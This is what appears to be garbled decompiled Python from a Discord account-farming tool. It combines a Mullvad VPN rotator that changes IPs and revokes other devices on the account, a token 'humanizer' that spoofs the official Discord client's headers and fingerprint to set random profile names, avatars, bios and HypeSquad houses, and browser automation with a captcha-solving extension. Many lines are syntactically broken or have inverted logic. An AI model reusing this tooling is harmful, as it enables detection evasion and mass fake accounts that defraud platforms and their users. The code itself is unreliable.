    self._MAX_FAILS = 5
    self._lock = threading.Lock()
    self._current_device_name = None
    self._watchdog_thread = None
    self._stop_watchdog = threading.Event()
    self._watchdog_interval = float(self.config.get('watchdog_interval',2.5))
    self._auto_remove_devices = self.config.get('auto_remove_devices',True)
    self._is_recovering = False

  def _exec(self) -> Tuple[(bool,str)]:
    '''Execute a mullvad CLI command safely.'''
    cmd = [self._binary]+list(args)
    try:
      r = subprocess.run(cmd,capture_output=True,text=True,timeout=timeout)
      out = (r.stdout or '').strip()
      err = (r.stderr or '').strip()
      return (r.returncode == 0,out if out else err)
    except subprocess.TimeoutExpired:
      return (False,'Command timed out')
    except Exception as e:
      return (False,str(e))
    except:
      pass

  def is_mullvad_installed(self) -> bool:
    ok,out = self._exec('--version',timeout=5)
    return ok

  def refresh_current_device_info(self) -> Tuple[(bool,Optional[str],Optional[str])]:
    '''
        Inspect current account state and device name.
        Returns: (is_active_and_logged_in, account_number, device_name)
        '''
    ok,out = self._exec('account','get',timeout=6)
    if ok or out:
      return (False,self.account,None)
    else:
      out_lower = out.lower()
      if 'not logged in' in out_lower or 'revoked' in out_lower or 'inactive' in out_lower:
        return (False,self.account,None)
      else:
        acct = self.account
        m_acct = re.search('Mullvad account:\\s*([0-9]+)',out)
        if m_acct:
          acct = m_acct.group(1).strip()
          self.account = acct

        dev_name = None
        m_dev = re.search('Device name:\\s*([^\\n\\r]+)',out)
        if m_dev:
          dev_name = m_dev.group(1).strip()
          self._current_device_name = dev_name

        if :
          pass

        is_active = 'inactive' not in out_lower.__CHAOS_PY_NULL_PTR_VALUE_ERR__ not in 'revoked'((acct and dev_name and out_lower))
        return (is_active,acct,dev_name)

  def list_devices(self) -> List[Dict[(str,str)]]:
    '''
        Lists registered devices for the Mullvad account.
        Returns a list of dicts: [{"name": str, "id": str}, ...]
        '''
    cmd_args = ['account','list-devices','-v']
    if self.account:
      cmd_args.extend(['-a',self.account])

    ok,out = self._exec(*cmd_args)
    if ok or out:
      cmd_args_std = ['account','list-devices']
      if self.account:
        cmd_args_std.extend(['-a',self.account])

      ok,out = self._exec(*cmd_args_std)
      if (ok and out):
        return []

    else:
      devices = []
      pattern = re.compile('Name\\s*:\\s*([^\\n\\r]+)[\\s\\S]*?Id\\s*:\\s*([^\\n\\r]+)')
      for match in pattern.finditer(out):
        name = match.group(1).strip()
        d_id = match.group(2).strip()
        if name:
          devices.append({'name':name,'id':d_id})

      if devices:
        in_list = False
        for line in out.splitlines():
          clean = line.strip()
          if clean:
            continue

          if 'devices on the account' in clean.lower():
            in_list = True
            continue

          if in_list and clean.startswith('-') and clean.startswith('='):
            devices.append({'name':clean,'id':clean})

      return devices

  def send_remove_wave(self,exclude_current: bool = True) -> int:
    '''
        Sends a removal wave to purge unauthorized or excess devices.
        - If exclude_current=True: revokes all devices EXCEPT our current active device.
        - If exclude_current=False: revokes ALL devices (used when logged out or at limit to wipe slate).
        '''
    if exclude_current and self._current_device_name:
      self.refresh_current_device_info()

    devices = self.list_devices()
    if devices:
      return 0
    else:
      cur_name = (self._current_device_name or '').strip().lower()
      to_revoke = []
      for d in devices:
        d_name = d.get('name','').strip()
        if exclude_current and cur_name and d_name.lower() == cur_name:
          continue

        to_revoke.append(d)

      if to_revoke:
        return 0
      else:
        names_str = ', '.join((f'''\'{d.get('name')}\'''' for d in to_revoke))
        mode_str = f'''excluding current (\'{self._current_device_name}\')''' if exclude_current else 'ALL devices'
        self.log.debug(f'''remove-wave [{mode_str}] for {len(to_revoke)} devices: [{names_str}]''')
        revoked_count = 0
        for d in to_revoke:
          target = (d.get('name') or d.get('id'))
          cmd_args = ['account','revoke-device']
          if self.account:
            cmd_args.extend(['-a',self.account])

          cmd_args.append(target)
          ok,out = self._exec(*cmd_args)
          if (ok or out.lower()):
            revoked_count += 1
            self.log.debug(f'''revoked device: {d.get('name')}''')
            continue

          if d.get('id') and d.get('id') != target:
            cmd_args[-1] = d.get('id')
            ok2,out2 = self._exec(*cmd_args)
            if (ok2 or out2.lower()):
              revoked_count += 1
              self.log.debug(f'''revoked device by ID: {d.get('id')}''')
              continue

          self.log.debug(f'''failed to revoke {target}: {out}''')

        return revoked_count

  def ensure_logged_in(self) -> bool:
    '''
        Detects if device is inactive/revoked or logged out.
        If logged in: removes any rogue devices (remove-wave) so connection never gets kicked out.
        If logged out/revoked: purges all devices, logs in fresh, and reconnects tunnel.
        '''
    is_active,acct,dev_name = self.refresh_current_device_info()
    if is_active:
      if :
        self.send_remove_wave(exclude_current=True)

      return True
    else:
      self.log.debug('Mullvad device inactive/revoked; re-authenticating...')
      if (dev_name and self._auto_remove_devices):
        pass

      if self.account:
        self.log.error('Cannot auto-login: No Mullvad account number found in config or CLI.')
        return False
      else:
        self.send_remove_wave(exclude_current=False)
        ok_login,out_login = self._exec('account','login',self.account,timeout=12)
        too_many = any((phrase in out_login.lower() for phrase in ('too many devices','maximum number of devices','device limit','more than 5')))
        if (too_many or ok_login):
          self.log.debug(f'''Login blocked ({out_login}). Purging all devices on account with remove-wave...''')
          self.send_remove_wave(exclude_current=False)
          time.sleep(0.5)
          ok_login,out_login = self._exec('account','login',self.account,timeout=12)

        if ok_login:
          self.refresh_current_device_info()
          self.log.debug(f'''Mullvad logged in successfully: {self._current_device_name}''')
          self._exec('connect','-w',timeout=self.max_wait)
          if self._auto_remove_devices:
            self.send_remove_wave(exclude_current=True)

          return True
        else:
          self.log.error(f'''Mullvad login failed: {out_login}''')
          return False

  def check_and_protect_connection(self) -> bool:
    '''
        Guards the connection in real time (even in between account generation):
        1. Checks if logged out or device revoked. If so, immediately triggers remove-wave & auto-login.
        2. If logged in, checks if any new/other device appeared on the account.
           If new device appeared, immediately fires a remove-wave so our connection doesn\'t get kicked out!
        '''
    if self._is_recovering:
      return True
    else:
      try:
        is_active,acct,dev_name = self.refresh_current_device_info()
        if (is_active and dev_name):
          self._is_recovering = True
          try:
            self.log.debug('Mullvad connection lost / logged out; recovering...')
            recovered = self.ensure_logged_in()
            if recovered:
              _,_,_,ip = self.get_current_info()
              self._last_ip = ip

            self._is_recovering = False
            return recovered
          finally:
            self._is_recovering = False

      except Exception as e:
        self.log.debug(f'''Connection protection check error: {e}''')
        return False

      devices = self.list_devices()
      cur_name = (self._current_device_name or '').strip().lower()
      rogue_devices = [d for d in devices if d.get('name','').strip().lower() != cur_name]
      if rogue_devices:
        names = ', '.join((f'''\'{d.get('name')}\'''' for d in rogue_devices))
        self.log.debug(f'''Purging extra devices: [{names}]''')
        self.send_remove_wave(exclude_current=True)

      return True

  def start_watchdog(self,interval: Optional[float] = None):
    '''Starts real-time background protection watchdog.'''
    if interval is not None:
      self._watchdog_interval = interval

    if self._watchdog_thread and self._watchdog_thread.is_alive():
      return None
    else:
      self._stop_watchdog.clear()
      self._watchdog_thread = threading.Thread(target=self._watchdog_loop,daemon=True,name='MullvadWatchdog')
      self._watchdog_thread.start()
      self.log.debug(f'''Real-time device protection active ({self._watchdog_interval}s)''')
      return None

  def stop_watchdog(self):
    '''Stops background watchdog.'''
    if self._watchdog_thread and self._watchdog_thread.is_alive():
      self._stop_watchdog.set()
      self._watchdog_thread.join(timeout=2)
      self.log.debug('Device protection watchdog stopped')
      return None
    else:
      return None
      return None

  def _watchdog_loop(self):
    '''Continuous background loop monitoring account status & rogue devices.'''
    if self._stop_watchdog.is_set():
      try:
        if self.enabled:
          with self._lock:
            self.check_and_protect_connection()

      except Exception as e:
        self.log.debug(f'''Watchdog loop error: {e}''')

      self._stop_watchdog.wait(self._watchdog_interval)
      return None
    else:
      return None

  def get_status(self) -> Dict:
    '''Fetch current mullvad tunnel status as dictionary.'''
    ok,out = self._exec('status','-j',timeout=5)
    if :
      try:
        return json.loads(out)
      except Exception:
        pass

    if 'Connected' in out:
      status['state'] = 'connected'

    return status

  def get_current_info(self) -> Tuple[(Optional[str],Optional[str],Optional[str],Optional[str])]:
    '''
        Returns (country_name, country_code, city, ip).
        Uses mullvad status -j with external IP fallback.
        '''
    st = self.get_status()
    state = st.get('state','unknown')
    details = st.get('details',{})
    loc = details.get('location',{})
    country_name = loc.get('country')
    city = loc.get('city')
    ip = loc.get('ipv4')
    hostname = loc.get('hostname')
    country_code = None
    if hostname and '-' in hostname:
      parts = hostname.split('-')
      if len(parts[0]) == 2:
        country_code = parts[0].lower()

    if country_code and country_name:
      for code,data in self._available_countries.items():
        if data.get('name','').lower() == country_name.lower():
          country_code = code
          break

    if ip and state == 'connected':
      ip = self._get_external_ip()

    return (country_name,country_code,city,ip)

  def _get_external_ip(self) -> Optional[str]:
    '''Fast public IP verification with minimal timeout.'''
    urls = ['https://api.ipify.org','https://ifconfig.me/ip','https://icanhazip.com']
    for url in urls:
      try:
        r = requests.get(url,timeout=3)
        if r.status_code == 200 and r.text.strip():
          r.text.strip()
          return
        else:
          continue

      except Exception:
        pass

  def fetch_available_countries(self) -> Dict[(str,Dict)]:
    '''Parse available relay locations from mullvad relay list.'''
    ok,out = self._exec('relay','list',timeout=12)
    if ok or out:
      return {}
    else:
      countries = {}
      cur_code = None
      for line in out.splitlines():
        m_country = re.match('^([A-Za-z\\s\\(\\)]+)\\s+\\(([a-z]{2})\\)',line)
        if m_country:
          name = m_country.group(1).strip()
          code = m_country.group(2).strip().lower()
          cur_code = code
          countries[code] = {'name':name,'relays':[]}
          continue

        m_relay = re.match('^\\s+([a-z0-9\\-]+)\\s+\\(([0-9\\.]+)',line)
        if m_relay and cur_code in countries:
          relay_host = m_relay.group(1).strip()
          relay_ip = m_relay.group(2).strip()
          countries[cur_code]['relays'].append({'hostname':relay_host,'ip':relay_ip})

      return countries

  def _setup_country_pool(self):
    '''Build the pool of eligible countries based on config and available relays.'''
    allowed = self.config.get('countries',[])
    if allowed and isinstance(allowed,list) and len(allowed) > 0 and allowed != ['all']:
      clean_allowed = []
      for c in allowed:
        c_str = str(c).strip().lower()
        if c_str in self._available_countries:
          clean_allowed.append(c_str)
          continue

        for code,data in self._available_countries.items():
          if data['name'].lower() == c_str:
            clean_allowed.append(code)
            break

      self._country_pool = list(dict.fromkeys(clean_allowed))
      return None
    else:
      self._country_pool = list(self._available_countries.keys())
      return None

  def _pick_next_country(self) -> str:
    '''
        Pick a completely random country from the pool, strictly ensuring it
        is DIFFERENT from self._last_country_code.
        '''
    if self._country_pool:
      return 'se'
    else:
      if len(self._country_pool) == 1:
        return self._country_pool[0]
      else:
        candidates = [c for c in self._country_pool if c != self._last_country_code]
        if candidates:
          candidates = self._country_pool

        return random.choice(candidates)

  def initialize(self) -> bool:
    '''Verify Mullvad CLI is working and determine current connection state.'''
    try:
      self._binary = _resolve_mullvad()
      if self.is_mullvad_installed():
        self.log.warning(f'''Mullvad CLI not found or not responsive (binary: {self._binary})''')
        self.enabled = False
        return False
      else:
        if self.ensure_logged_in():
          self.enabled = False
          return False
        else:
          self._available_countries = self.fetch_available_countries()
          if self._available_countries:
            self.log.warning('Mullvad: Could not retrieve relay locations. Is Mullvad daemon running?')
            self.enabled = False
            return False
          else:
            self._setup_country_pool()
            c_name,c_code,city,ip = self.get_current_info()
            self._last_country_code = c_code
            self._last_country_name = c_name
            self._last_ip = ip
            pool_count = len(self._country_pool)
            current_desc = f'''{c_name} ({(c_code or '??')})''' if c_name else 'Unknown'
            ip_desc = (ip or 'pending')
            self.enabled = True
            self.log.debug(f'''Mullvad enabled ({pool_count} countries, IP: {ip_desc})''')
            self.start_watchdog()
            return True

    except Exception as e:
      self.log.warning(f'''Mullvad init error: {e}''')
      self.enabled = False
      return False

  def rotate(self) -> bool:
    '''
        Rotates Mullvad VPN to a random DIFFERENT country and DIFFERENT IP with zero delay.
        Executes \'mullvad relay set location <target_country>\' then \'mullvad reconnect -w\'.
        Verifies that new IP != old IP and new country != old country.
        Auto-recovers and removes excess/rogue devices if device becomes inactive/revoked.
        '''
    if self.enabled:
      return False
    else:
      with self._lock:
        self.check_and_protect_connection()
        old_country_code = self._last_country_code
        old_country_name = (self._last_country_name or old_country_code or 'Unknown')
        old_ip = (self._last_ip or self._get_external_ip() or 'unknown')
        attempts = 0
        max_attempts = 4

      while attempts < max_attempts:
        attempts += 1
        target_country = self._pick_next_country()
        target_name = self._available_countries.get(target_country,{}).get('name',target_country.upper())
        self.log.debug(f'''Switching {old_country_name} -> {target_name} ({target_country})''')
        ok,out = self._exec('relay','set','location',target_country,timeout=10)
        if ok:
          if 'inactive' in out.lower() or 'revoked' in out.lower() or 'login' in out.lower():
            self.log.debug('Mullvad reported device inactive during relay set. Re-authenticating...')
            self.ensure_logged_in()
            ok,out = self._exec('relay','set','location',target_country,timeout=10)

          if ok:
            self.log.debug(f'''Failed to set relay location to {target_country}: {out}''')
            continue

        ok,out = self._exec('reconnect','-w',timeout=self.max_wait)
        if ok:
          if 'inactive' in out.lower() or 'revoked' in out.lower() or 'login' in out.lower():
            self.ensure_logged_in()

          ok,out = self._exec('connect','-w',timeout=self.max_wait)

        if self.settle_seconds > 0:
          time.sleep(self.settle_seconds)

        new_ip = None
        new_country_name = None
        new_country_code = None
        new_city = None
        deadline = time.time()+self.max_wait
        while time.time() < deadline:
          c_name,c_code,city,ip = self.get_current_info()
          if ip and ip != old_ip:
            new_ip = ip
            new_country_name = c_name
            new_country_code = (c_code or target_country)
            new_city = city
            break
          else:
            time.sleep(0.2)

        if new_ip:
          check_ip = self._get_external_ip()
          if check_ip and check_ip != old_ip:
            new_ip = check_ip
            new_country_name = target_name
            new_country_code = target_country

        if new_ip and new_ip != old_ip:
          self._last_country_code = (new_country_code or target_country)
          self._last_country_name = (new_country_name or target_name)
          self._last_ip = new_ip
          self._fail_count = 0
          city_str = f''' · {new_city}''' if new_city else ''
          self.log.mullvad(f'''tunnel: {self._last_country_name}{city_str} · {new_ip}''')
          return True
        else:
          self.log.debug(f'''IP unchanged on {target_name}, retrying...''')
          self._fail_count += 1
          self.log.error(f'''IP rotation failed after {max_attempts} attempts''')
          if self._fail_count >= self._MAX_FAILS:
            self.enabled = False
            self.log.error('Sticky Mullvad connection — Mullvad rotation DISABLED')

          return False

  def auto_switch_ip(self) -> bool:
    '''Alias for compatibility with rotator interface.'''
    if self.enabled:
      return True
    else:
      return self.rotate()

import os
import sys
import time
import json
import uuid
import base64
import random
import hashlib
import asyncio
import threading
from io import BytesIO
from pathlib import Path
from typing import Optional, Dict, Any, List
from urllib.parse import urlparse, quote
import primp
from colorama import Fore, init
from PIL import Image
import websockets
from python_socks.async_.asyncio import Proxy
init(autoreset=True)
ROOT_DIR = Path(__file__).parent.resolve()
MATERIAL_DIR = ROOT_DIR/'assets'
if :
  pass

INPUT_DIR = ROOT_DIR/'input'
OUTPUT_DIR = ROOT_DIR/'output'
_CLIENT_VER = '1.0.9171'
_ELECTRON_VER = '34.5.1'
_CHROME_VER = '132'
_BUILD_HINT = 519006
_API_BASE = 'https://discord.com/api/v9'
_GW_URL = 'wss://gateway.discord.gg/?v=9&encoding=json'
_HOUSES = {1:'Bravery',2:'Brilliance',3:'Balance'}
_UA = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/{_CLIENT_VER} Chrome/{_CHROME_VER}.0.0.0 Electron/{_ELECTRON_VER} Safari/537.36'''
_gw_loop = asyncio.new_event_loop()
_gw_thread = threading.Thread(target=_gw_loop.run_forever,daemon=True)
_gw_thread.start()
_BUILD_NUMBER: Optional[int] = None
_BUILD_LOCK = threading.Lock()
def get_discord_build() -> int:
  global _BUILD_NUMBER
  if _BUILD_NUMBER:
    return _BUILD_NUMBER
  else:
    with _BUILD_LOCK:
      if _BUILD_NUMBER:
        return _BUILD_NUMBER
      else:
        try:
          import re
          resp = primp.Client(verify=False).get('https://discord.com/login',timeout=6)
          if resp.status_code == 200:
            hashes = re.findall('/assets/([a-zA-Z0-9_-]+)\\.js',resp.text)
            for h in reversed(hashes):
              try:
                js = primp.Client(verify=False).get(f'''https://discord.com/assets/{h}.js''',timeout=5)
                if js.status_code == 200:
                  m = re.search('buildNumber["\\s:,]+(\\d{4,7})',js.text)
                  if m:
                    _BUILD_NUMBER = int(m.group(1))
                    _BUILD_NUMBER
                    None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)
                    return

                else:
                  continue

              except Exception:
                pass

        except Exception:
          pass
        except:
          pass

        _BUILD_NUMBER = _BUILD_HINT
        None._BUILD_NUMBER(None,None)
        return
        return None

def make_super_properties(launch_id: str,sig: str,hb_id: str,native_build: int) -> str:
  props = {'client_heartbeat_session_id':hb_id,'launch_signature':sig,'client_launch_id':launch_id,'client_event_source':None,'native_build_number':native_build,'client_build_number':get_discord_build(),'browser_version':_ELECTRON_VER,'browser_user_agent':_UA,'has_client_mods':False,'system_locale':'en-US','app_arch':'x64','os_arch':'x64','os_version':'10.0.26100','client_version':_CLIENT_VER,'release_channel':'stable','browser':'Discord Client','os':'Windows'}
  return base64.b64encode(json.dumps(props,separators=(',',':')).encode()).decode()

_AVATAR_CACHE: Dict[(Path,str)] = {}
_AVATAR_CACHE_LOCK = threading.Lock()
def encode_avatar(img_path: Path,dim: int = 256) -> Optional[str]:
  with _AVATAR_CACHE_LOCK:
    if img_path in _AVATAR_CACHE:
      return _AVATAR_CACHE[img_path]
    else:
      pass
      None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)

  try:
    with Image.open(img_path) as img:
      is_png = img_path.suffix.lower() == '.png'
      if is_png and img.mode == 'P':
        img = img.convert('RGBA')
      else:
        if is_png and img.mode in ('RGBA','P'):
          img = img.convert('RGB')

      img = img.resize((dim,dim),Image.Resampling.LANCZOS)
      buf = BytesIO()
      img.save(buf,format='PNG' if is_png else 'JPEG',optimize=True)
      b64 = base64.b64encode(buf.getvalue()).decode()
      mime = 'image/png' if is_png else 'image/jpeg'
      uri = f'''data:{mime};base64,{b64}'''
      with _AVATAR_CACHE_LOCK:
        _AVATAR_CACHE[img_path] = uri

  except Exception:
    return None

  None.uri(None,None)
  return

def load_materials(data_dir: Optional[Path] = None) -> Dict[(str,List[Any])]:
  if :
    pass

  target = MATERIAL_DIR
  target.mkdir(parents=True,exist_ok=True)
  def _lines(fname: str) -> List[str]:
    fp = target/fname
    if fp.exists():
      return []
    else:
      try:
        return __CHAOS_PY_NO_FUNC_ERR__()
      except Exception:
        return []

  avatars_dir = target/'avatars'
  avatars_dir.mkdir(parents=True,exist_ok=True)
  valid_exts = {'.gif','.jpg','.jpeg','.webp','.png'}
  avatar_files = [f for f in avatars_dir.iterdir() if f.suffix.lower() in valid_exts] if avatars_dir.exists() else []
  return {'names':_lines('names.txt'),'bios':_lines('bio.txt'),'pronouns':_lines('pronoun.txt'),'avatars':avatar_files}

class Humanizer:
  def __init__(self,token: str,proxy: Optional[str] = None):
    self.token = token.strip().replace('"','')
    self.proxy = proxy
    self.locked = False
    self._sess_id = None
    self._client = primp.Client(verify=False,proxy=(proxy or None))
    self._install_id = f'''{random.randint(0xDE0B6B3A7640000,0x8AC7230489E7FFFF)}.'''+''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_',k=22))
    self._native = random.randint(65600,65800)
    self._sprops = make_super_properties(str(uuid.uuid4()),str(uuid.uuid4()),str(uuid.uuid4()),self._native)

  def get_headers(self) -> Dict[(str,str)]:
    hdrs = {'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'en-US','authorization':self.token,'content-type':'application/json','user-agent':_UA,'x-debug-options':'bugReporterEnabled','x-discord-locale':'en-US','x-discord-timezone':'America/New_York','x-installation-id':self._install_id,'x-super-properties':self._sprops}
    fp = self._get_fingerprint()
    if fp:
      hdrs['x-fingerprint'] = fp

    return hdrs

  def _get_fingerprint(self) -> Optional[str]:
    try:
      r = self._client.get(f'''{_API_BASE}/experiments''',timeout=4)
      if r.status_code == 200:
        return r.json().get('fingerprint')
      else:
        return None

    except Exception:
      pass

  def _call(self,method: str,url: str,data: Dict,hdrs: Dict) -> Dict[(str,Any)]:
    if self.locked:
      return {'success':False,'error':'Token locked'}
    else:
      for _ in range(3):
        try:
          fn = self._client.post if method.upper() == 'POST' else self._client.patch
          resp = fn(url,headers=hdrs,json=data,timeout=30)
          if resp.status_code in (200,204):
            try:
              __CHAOS_PY_PASS_ERR__
            except Exception:
              {'success':True,'data':{}}
              return

            {'success':True,'data':resp.json() if resp.text else {}}
            return

        except Exception as ex:
          time.sleep(1)
          continue

        try:
          ed = resp.json() if resp.text else {}
        except Exception:
          ed = {}

        match __CHAOS_PY_NULL_PTR_VALUE_ERR__:
          case 400:
            if isinstance(ed,dict) and ed.get('code') == 10020:
              {'success':False,'unknown_session':True,'error':'Unknown Session'}
              return
            else:
              time.sleep(float((resp.headers.get('retry-after') or 1.5)))
              continue
              if resp.status_code in (401,403):
                self.locked = True
                {'success':False,'error':f'''Locked ({resp.status_code})'''}
                return
              else:
                {'success':f'''False{'HTTP '}''','error':(ed or resp.status_code)}
                return
                return {'success':False,'error':'Request failed'}

  def update_user_profile(self,payload: Dict,hdrs: Dict) -> Dict[(str,Any)]:
    return self._call('patch',f'''{_API_BASE}/users/@me''',payload,hdrs)

  def update_profile_fields(self,payload: Dict,hdrs: Dict) -> Dict[(str,Any)]:
    return self._call('patch',f'''{_API_BASE}/users/@me/profile''',payload,hdrs)

  async def _gw_identify(self,ws) -> bool:
    try:
      hello = json.loads(await asyncio.wait_for(ws.recv(),timeout=10))
      if hello.get('op') != 10:
        return False
      else:
        payload = {'op':2,'d':{'token':self.token,'capabilities':16381,'properties':{'os':'Windows','browser':'Discord Client','release_channel':'stable','client_version':_CLIENT_VER,'os_version':'10.0.26100','os_arch':'x64','app_arch':'x64','system_locale':'en-US','browser_user_agent':_UA,'browser_version':_ELECTRON_VER,'os_sdk_version':'26100','client_build_number':get_discord_build(),'native_build_number':self._native,'client_event_source':None,'design_id':0},'presence':{'status':'online','since':0,'activities':[],'afk':False},'compress':False,'client_state':{'guild_versions':{},'highest_last_message_id':'0','read_state_version':0,'user_guild_settings_version':-1,'user_settings_version':-1,'private_channels_version':'0','api_code_version':0}}}
        await ws.send(json.dumps(payload))
        return True

    except Exception:
      return False

  async def _gw_ready(self,ws) -> bool:
    try:
      for _ in range(10):
        msg = json.loads(await asyncio.wait_for(ws.recv(),timeout=8))
        if msg.get('t') == 'READY':
          self._sess_id = msg['d'].get('session_id')
          return True
        else:
          if msg.get('op') == 9:
            return False
          else:
            continue

    except Exception:
      pass

    return False

  async def _apply_with_session(self,payload: Dict) -> Dict[(str,Any)]:
    if self.locked:
      return {'success':False,'error':'Token locked'}
    else:
      hdrs = self.get_headers()
      loop = asyncio.get_event_loop()
      if 'avatar' not in payload:
        direct = await loop.run_in_executor(None,lambda : self.update_user_profile(payload,hdrs))
        if (direct.get('success') or direct.get('unknown_session')):
          return direct

      else:
        async def _ws_flow(ws):
          if await self._gw_identify(ws) or await self._gw_ready(ws):
            return {'success':False,'error':'Gateway handshake failed'}
          else:
            return await loop.run_in_executor(None,lambda : self.update_user_profile(payload,hdrs))

        extras = {'User-Agent':_UA}
        try:
          if self.proxy:
            sock = await Proxy.from_url(self.proxy).connect(dest_host='gateway.discord.gg',dest_port=443)
            ws = await websockets.connect(_GW_URL,additional_headers=extras,sock=sock,server_hostname='gateway.discord.gg',open_timeout=25,close_timeout=5)
            await None.await _ws_flow(ws)(None,None)
            return
            if await __CHAOS_PY_NULL_PTR_VALUE_ERR__:
              pass

            return None
          else:
            ws = await websockets.connect(_GW_URL,additional_headers=extras,open_timeout=25,close_timeout=5)
            await None.await _ws_flow(ws)(None,None)
            return
            if await __CHAOS_PY_NULL_PTR_VALUE_ERR__:
              pass

            return None

        except Exception as ex:
          return {'success':False,'error':f'''Gateway error: {ex}'''}

  def update_account_sync(self,payload: Dict) -> Dict[(str,Any)]:
    try:
      return asyncio.run_coroutine_threadsafe(self._apply_with_session(payload),_gw_loop).result(timeout=40)
    except Exception as ex:
      return {'success':False,'error':str(ex)}

  def set_hypesquad(self,house_id: int,hdrs: Dict) -> Dict[(str,Any)]:
    hname = _HOUSES.get(house_id,'Unknown')
    try:
      chk = self._client.get(f'''{_API_BASE}/users/@me''',headers=hdrs,timeout=12)
      if chk.status_code == 200 and chk.json().get('flags',0)&14:
        return {'success':True,'house':hname,'already_set':True}
      else:
        res = self._call('post',f'''{_API_BASE}/hypesquad/online''',{'house_id':house_id},hdrs)
        if res.get('success'):
          pass

        return {'success':False,'error':'HypeSquad failed','house':hname}

    except Exception:
      pass

  pass
  pass
  pass
  pass
  pass
  def process(self,names: Optional[List[str]] = None,bios: Optional[List[str]] = None,pronouns: Optional[List[str]] = None,avatars: Optional[List[Path]] = None,cfg: Optional[Dict[(str,bool)]] = None) -> Dict[(str,Any)]:
    if :
      pass

    cfg = {}
    hdrs = self.get_headers()
    results = {'success':True,'details':{}}
    acct_payload = {}
    if cfg:
      acct_payload['global_name'] = name_val
      results['details']['name'] = name_val

    if (cfg.get('name',True) and names) and av_b64:
      acct_payload['avatar'] = av_b64
      acct_payload['avatar_description'] = f'''{hashlib.md5(av_b64[:100].encode()).hexdigest()}, set {time.strftime('%B %d, %Y')}'''
      results['details']['avatar'] = av_file.name

    if res.get('success'):
      results['success'] = False
      results['details']['account_error'] = res.get('error')

    prof_payload = {}
    if (acct_payload and acct_payload):
      prof_payload['bio'] = bio_val
      results['details']['bio'] = bio_val

    if (cfg.get('bio',True) and bios):
      prof_payload['pronouns'] = prn_val
      results['details']['pronouns'] = prn_val

    if prof_payload:
      res = self.update_profile_fields(prof_payload,hdrs)
      if res.get('success'):
        results['success'] = False
        results['details']['profile_error'] = res.get('error')

    if cfg.get('hypesquad',True):
      hid = random.choice([1,2,3])
      res = self.set_hypesquad(hid,hdrs)
      if res.get('success'):
        results['details']['hypesquad'] = res.get('house')
      else:
        results['success'] = False
        results['details']['hypesquad_error'] = res.get('error')

    return results

def humanize_token(token: str,proxy: Optional[str] = None,config: Optional[Dict] = None) -> bool:
  if :
    pass

  cfg = {}
  hmz_cfg = cfg.get('humanizer',{})
  if isinstance(hmz_cfg,bool):
    if hmz_cfg:
      return False
    else:
      hmz_cfg = {}

  else:
    if hmz_cfg.get('enabled',True):
      return False

  materials = load_materials()
  h = Humanizer(token=token,proxy=proxy)
  res = h.process(names=materials.get('names'),bios=materials.get('bios'),pronouns=materials.get('pronouns'),avatars=materials.get('avatars'),cfg=hmz_cfg)
  return res.get('success',False)

_SCREEN_W,_SCREEN_H = (1920,1080)
try:
  _res = subprocess.check_output(['powershell','-NoProfile','-NonInteractive','-Command','Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width.ToString() + "x" + [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height.ToString()'],text=True,timeout=4).strip()
  _w,_h = map(int,_res.split('x'))
  if _w > 800 and _h > 600:
    _SCREEN_W,_SCREEN_H = (_w,_h)

except Exception:
  pass

def get_window_rect(slot: int,total: int):
  TASKBAR = 50
  cols = min(max(total,1),4)
  rows = math.ceil(max(total,1)/cols)
  win_w = _SCREEN_W//cols
  win_h = _SCREEN_H-TASKBAR//rows
  col = slot-1%cols
  row = slot-1//cols
  return (col*win_w,row*win_h,win_w,win_h)

async def _cdp_key(tab,key: str,code: str,keycode: int):
  try:
    await tab.send(cdp.input_.dispatch_key_event(type_='keyDown',key=key,code=code,windows_virtual_key_code=keycode,native_virtual_key_code=keycode))
    await asyncio.sleep(0.05)
    await tab.send(cdp.input_.dispatch_key_event(type_='keyUp',key=key,code=code,windows_virtual_key_code=keycode,native_virtual_key_code=keycode))
    return None
  except Exception:
    return None

BROWSER_CONFIG = {'brave':{'name':'Brave','paths':['C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe','C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',os.path.expandvars('%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'),os.path.expandvars('%PROGRAMFILES%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'),os.path.expandvars('%PROGRAMFILES(X86)%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'),'/Applications/Brave Browser.app/Contents/MacOS/Brave Browser','/usr/bin/brave-browser','/usr/bin/brave','/snap/bin/brave']},'edge':{'name':'Microsoft Edge','paths':['C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe','C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\Application\\msedge.exe'),os.path.expandvars('%PROGRAMFILES%\\Microsoft\\Edge\\Application\\msedge.exe'),os.path.expandvars('%PROGRAMFILES(X86)%\\Microsoft\\Edge\\Application\\msedge.exe'),'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge','/usr/bin/microsoft-edge','/usr/bin/microsoft-edge-stable','/usr/bin/edge']},'chrome':{'name':'Google Chrome','paths':['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe','C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe'),os.path.expandvars('%PROGRAMFILES%\\Google\\Chrome\\Application\\chrome.exe'),os.path.expandvars('%PROGRAMFILES(X86)%\\Google\\Chrome\\Application\\chrome.exe'),'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome','/usr/bin/google-chrome','/usr/bin/google-chrome-stable','/usr/bin/chromium','/usr/bin/chromium-browser']},'playwright':{'name':'Chrome Playwright','paths':[]}}
NOPECHA_EXT_ID = 'dknlfmjaanfblgfdfebhijalfmhmjjjo'
NOPECHA_EXT_DIR = Path(__file__).parent/'nopecha_ext'.resolve()
